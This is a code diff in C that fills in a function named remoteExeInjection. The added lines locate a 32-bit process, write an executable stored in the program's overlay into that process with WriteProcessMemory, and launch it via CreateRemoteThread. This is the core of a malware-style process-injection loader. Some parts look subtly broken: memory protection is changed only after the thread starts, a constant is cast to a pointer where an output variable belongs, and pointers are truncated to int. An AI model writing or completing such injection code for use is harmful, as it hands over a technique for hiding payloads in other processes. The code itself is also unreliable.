@@ -5,14 +5,15 @@
 #include "..\..\Shared\overlay.c"
 #include "..\..\Shared\findProcess.c"
 
+
 typedef void* HANDLE;
 
 
 void remoteExeInjection(){
     struct Overlay overlay;
-    getOverlay(overlay);
+    getOverlay(&overlay);
 
-    int pid = findPidOf32BitProcess();
+    int pid = findPidOf32BitProcess(6000);
     if (pid == 0){
         perror("Injection failed. Suitable process could not be found.\n");
         exit(EXIT_FAILURE);
@@ -30,9 +31,20 @@ void remoteExeInjection(){
         exit(EXIT_FAILURE);
     }
 
+    if (WriteProcessMemory(hProcess, remoteProcessAddress, overlay.overlayData, overlay.overlaySize, NULL) == 0){
+        perror("Injection failed. Could not write to remote process.\n");
+        exit(EXIT_FAILURE);
+    }
 
+    int peEntryPoint = getExecutableEntryPointFromOverlay((struct Executable *) &overlay);
+    LPVOID remoteEntryPoint = (LPVOID)((int)remoteProcessAddress + peEntryPoint);
+    HANDLE hNewThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteEntryPoint, NULL, 0, NULL);
+    if(hNewThread == NULL){
+        perror("Injection failed. Could not create remote thread.\n");
+        exit(EXIT_FAILURE);
+    }
 
-    if(VirtualProtectEx(hProcess, remoteProcessAddress, overlay.overlaySize, PAGE_EXECUTE_READ, PAGE_READWRITE) == 0){
+    if(VirtualProtectEx(hProcess, remoteProcessAddress, overlay.overlaySize, PAGE_EXECUTE_READ, (PDWORD)PAGE_READWRITE) == 0){
         perror("Injection failed. Could not change memory protection in remote process.\n");
         exit(EXIT_FAILURE);
     }
